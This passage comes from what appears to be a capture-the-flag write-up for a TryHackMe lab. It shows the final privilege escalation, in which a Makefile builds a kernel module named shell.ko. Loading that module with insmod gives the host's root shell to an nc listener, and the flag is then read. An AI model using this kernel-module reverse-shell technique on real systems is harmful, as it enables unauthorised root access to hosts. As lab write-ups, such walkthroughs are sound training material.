obj-m +=shell.o
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{: file="Makefile" }

Now, using `make` to compile the module and loading the compiled module.

```console
root@a8fc621bec0b:~# make
make -C /lib/modules/6.8.0-1018-aws/build M=/root modules
make[1]: Entering directory '/usr/src/linux-headers-6.8.0-1018-aws'
warning: the compiler differs from the one used to build the kernel
  The kernel was built by: x86_64-linux-gnu-gcc-12 (Ubuntu 12.3.0-1ubuntu1~22.04) 12.3.0
  You are using:           gcc-12 (Ubuntu 12.3.0-1ubuntu1~22.04) 12.3.0
  CC [M]  /root/shell.o
  MODPOST /root/Module.symvers
  CC [M]  /root/shell.mod.o
  LD [M]  /root/shell.ko
  BTF [M] /root/shell.ko
Skipping BTF generation for /root/shell.ko due to unavailability of vmlinux
make[1]: Leaving directory '/usr/src/linux-headers-6.8.0-1018-aws'

root@a8fc621bec0b:~# insmod shell.ko
```

With this, we get a shell as the `root` user on the host and can read the third flag at `/root/root.txt` to complete the challenge.

```console
$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.11.72.22] from (UNKNOWN) [10.10.14.175] 47438
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
root@tryhackme-2204:/# id
uid=0(root) gid=0(root) groups=0(root)
root@tryhackme-2204:/# wc -c /root/root.txt
44 /root/root.txt
```

<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}
</style>